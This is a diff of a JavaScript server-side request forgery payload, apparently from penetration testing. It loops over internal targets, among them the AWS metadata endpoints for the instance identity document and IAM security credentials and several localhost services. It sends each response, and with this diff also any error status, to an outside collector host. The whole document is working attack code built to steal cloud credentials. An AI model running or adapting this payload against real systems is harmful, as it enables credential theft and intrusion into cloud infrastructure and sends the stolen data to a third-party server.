@@ -6,18 +6,21 @@ function handler() {
       console.log("sending");
       //xhr2.onreadystatechange = none; 
       var xhr2 = new XMLHttpRequest();
-      xhr2.open("GET", 'https://67.208.216.106/SSRF?MARKMARK=1&u='+encodeURIComponent(this.responseText), true);
+      xhr2.open("GET", 'https://partners.immunityinc.com/SSRF?MARKMARK=1&u='+encodeURIComponent(this.responseText), true);
       xhr2.send();
 
   } else {
     // something went wrong
+    var xhr2 = new XMLHttpRequest();
+    xhr2.open("GET", 'https://partners.immunityinc.com/SSRF?MARKMARK=1&error='+encodeURIComponent(this.statusText), true);
+    xhr2.send();
   }
 }
 
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = handler;
 
-var urls = ["http://immunityinc.com","http://169.254.169.254/latest/dynamic/instance-identity/document","http://169.254.169.254/latest/meta-data/iam/security-credentials/admins","http://localhost:3000","http://localhost:3000/1/catalogs","http://ifconfig.pro","https://67.208.216.106/MARKMARK-url5","http://test-cors.org/"];
+var urls = ["http://immunityinc.com","http://169.254.169.254/latest/dynamic/instance-identity/document","http://169.254.169.254/latest/meta-data/iam/security-credentials/admins","http://localhost:3000","http://localhost:3000/1/catalogs","http://ifconfig.pro","https://partners.immunityinc.com"];
 var arrayLength = urls.length;
 for (var i = 0; i < arrayLength; i++) {
    try{
